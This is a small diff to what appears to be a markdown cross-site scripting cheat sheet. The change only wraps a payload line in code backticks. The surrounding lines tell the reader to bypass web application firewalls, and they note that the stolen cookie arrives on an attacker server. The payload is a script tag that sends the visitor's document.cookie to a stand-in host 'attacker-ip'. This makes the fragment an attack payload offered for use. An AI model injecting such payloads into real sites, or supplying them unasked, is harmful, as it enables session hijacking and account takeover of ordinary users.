@@ -12,4 +12,4 @@ Try to bypass the filters if there is any WAF
 ### 3. You will receive cookie on attacker-server
 
 ### Directly stealing the cookie(this may or may not work and try it with single quote & double quote and also bypass filter protection if WAF exist)
-<script>document.location='http://attacker-ip/?c='+document.cookie</script>
+```<script>document.location='http://attacker-ip/?c='+document.cookie</script>```
